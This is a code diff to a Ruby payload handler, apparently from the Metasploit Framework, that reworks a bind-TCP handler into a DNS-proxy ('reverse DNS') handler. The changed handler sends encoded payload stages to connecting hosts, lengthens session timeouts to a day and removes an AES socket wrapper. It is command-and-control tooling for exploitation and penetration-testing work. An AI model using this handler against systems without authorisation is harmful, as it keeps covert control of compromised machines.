@@ -4,8 +4,8 @@ module Handler
 
 ###
 #
-# This module implements the Bind TCP handler.  This means that
-# it will attempt to connect to a remote host on a given port for a period of
+# This module implements the reverse DNS handler.  This means that
+# it will attempt to connect to a remote DNS-Proxy host on a given port for a period of
 # time (typically the duration of an exploit) to see if a the payload has
 # started listening.  This can tend to be rather verbose in terms of traffic
 # and in general it is preferable to use reverse payloads.
@@ -17,7 +17,7 @@ module ReverseDns
 
   #
   # Returns the handler specific string representation, in this case
-  # 'bind_tcp'.
+  # 'reverse_dns'.
   #
   def self.handler_type
     return "reverse_dns"
@@ -81,8 +81,7 @@ module ReverseDns
   #
   def start_handler
     # Maximum number of seconds to run the handler
-    #queue = ::Queue.new
-    ctimeout = 5
+    ctimeout = 10
 
     if (exploit_config and exploit_config['active_timeout'])
       ctimeout = exploit_config['active_timeout'].to_i
@@ -115,26 +114,25 @@ module ReverseDns
           caller
       end
 
-      current_name = "NONE"
+      current_name = "STAGE"
       loop do
         begin          
           session = nil
+          
           #If last connection has a valid session or died        
           if (framework.sessions.length > 0)
-          
+            
             framework.sessions.each_sorted do |k|
               session = framework.sessions[k]
-            end
-
-            
+            end 
             current_name = session.machine_id.to_s
           else
-            current_name = "NONE"
+            current_name = "STAGE"
           end
           
           stime = Time.now.to_i
           
-          if (current_name != "" or framework.sessions.length == 0)       
+          if (current_name != "")       
             
             while (stime + ctimeout > Time.now.to_i)
               begin
@@ -150,20 +148,19 @@ module ReverseDns
                 })
               rescue Rex::ConnectionRefused
                 # Connection refused is a-okay
+                
               rescue ::Exception
                 wlog("Exception caught in bind handler: #{$!.class} #{$!}")
               end
-
+              
               break if client
-
+              
               # Wait a second before trying again
               Rex::ThreadSafe.sleep(0.5)
             end
-
+            
             # Valid client connection?
             if (client)
-              
-              #lqueue.push(client)
               
               # Increment the has connection counter
               self.pending_connections += 1
@@ -172,23 +169,82 @@ module ReverseDns
               opts = {
                 :datastore    => datastore,
                 :expiration   => datastore['SessionExpirationTimeout'].to_i,
-                :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
+                :comm_timeout => 60*60*24,
                 :retry_total  => datastore['SessionRetryTotal'].to_i,
                 :retry_wait   => datastore['SessionRetryWait'].to_i,
-                :timeout      => 60*20
+                :timeout      => 60*20,
+                :send_keepalives => false
               }
               
               
               # Start a new thread and pass the client connection
               # as the input and output pipe.  Client's are expected
               # to implement the Stream interface.
-              conn_threads << framework.threads.spawn("BindTcpHandlerSession", false, client) { |client_copy|
-                begin
+              conn_threads << framework.threads.spawn("BindDnsHandlerSession", false, client) { |client_copy|
+                begin 
                   
+                  nosess = false
+                  #SEND SERVER_ID
                   client_copy.put([server_id.length].pack("C") + server_id)
-                  handle_connection(wrap_aes_socket(client_copy), opts)
+                  conn = client_copy
+                  #First connect,  stage is needed? (or it not the first session and stage alredy there..
+                  #    or it is a stageless payload)
+                  if (current_name == "STAGE" and self.payload_type != Msf::Payload::Type::Single) 
+                    if respond_to? :include_send_uuid
+                      if include_send_uuid
+                        uuid_raw = conn.get_once(16, 1)
+                        if uuid_raw
+                          opts[:uuid] = Msf::Payload::UUID.new({raw: uuid_raw})
+                        end
+                      end
+                    end
+                    p = generate_stage(opts)
+                    # Encode the stage if stage encoding is enabled
+                    begin
+                      p = encode_stage(p)
+                    rescue ::RuntimeError
+                      warning_msg = "Failed to stage"
+                      warning_msg << " (#{conn.peerhost})"  if conn.respond_to? :peerhost
+                      warning_msg << ": #{$!}"
+                      print_warning warning_msg
+                      if conn.respond_to? :close && !conn.closed?
+                        conn.close
+                      end
+                      nosess = true
+                    end
+
+                    # Give derived classes an opportunity to an intermediate state before
+                    # the stage is sent.  This gives derived classes an opportunity to
+                    # augment the stage and the process through which it is read on the
+                    # remote machine.
+                    #
+                    # If we don't use an intermediate stage, then we need to prepend the
+                    # stage prefix, such as a tag
+                    if handle_intermediate_stage(conn, p) == false
+                      p = (self.stage_prefix || '') + p
+                    end
+
+                    sending_msg = "Sending #{encode_stage? ? "encoded ":""}stage"
+                    sending_msg << " (#{p.length} bytes)"
+                    # The connection should always have a peerhost (even if it's a
+                    # tunnel), but if it doesn't, erroring out here means losing the
+                    # session, so make sure it does, just to be safe.
+                    if conn.respond_to? :peerhost
+                      sending_msg << " to #{conn.peerhost}"
+                    end
+                    print_status(sending_msg)
+
+                    # Send the stage
+                    conn.put(p)
+                  end
+                  
+                  #Start the session
+                  handle_connection(conn, opts)
+                  
+                  self.send_keepalives = false
+                  
                 rescue
-                  elog("Exception raised from BindTcp.handle_connection: #{$!}")
+                  elog("Exception raised from BindDns.handle_connection: #{$!}")
                 end
               }
               Rex::ThreadSafe.sleep(5)
@@ -204,52 +260,7 @@ module ReverseDns
     }
   end
 
-  def wrap_aes_socket(sock)
-    if datastore["PAYLOAD"] !~ /java\// or (datastore["AESPassword"] || "") == ""
-      return sock
-    end
-
-    socks = Rex::Socket::tcp_socket_pair()
-    socks[0].extend(Rex::Socket::Tcp)
-    socks[1].extend(Rex::Socket::Tcp)
-
-    m = OpenSSL::Digest.new('md5')
-    m.reset
-    key = m.digest(datastore["AESPassword"] || "")
-
-    Rex::ThreadFactory.spawn('AESEncryption', false) {
-      c1 = OpenSSL::Cipher::Cipher.new('aes-128-cfb8')
-      c1.encrypt
-      c1.key=key
-      sock.put([0].pack('N'))
-      sock.put(c1.iv=c1.random_iv)
-      buf1 = socks[0].read(4096)
-      while buf1 and buf1 != ""
-        sock.put(c1.update(buf1))
-        buf1 = socks[0].read(4096)
-      end
-      sock.close()
-    }
-
-    Rex::ThreadFactory.spawn('AESEncryption', false) {
-      c2 = OpenSSL::Cipher::Cipher.new('aes-128-cfb8')
-      c2.decrypt
-      c2.key=key
-      iv=""
-      while iv.length < 16
-        iv << sock.read(16-iv.length)
-      end
-      c2.iv = iv
-      buf2 = sock.read(4096)
-      while buf2 and buf2 != ""
-        socks[0].put(c2.update(buf2))
-        buf2 = sock.read(4096)
-      end
-      socks[0].close()
-    }
-
-    return socks[1]
-  end
+  
 
   #
   # Nothing to speak of.
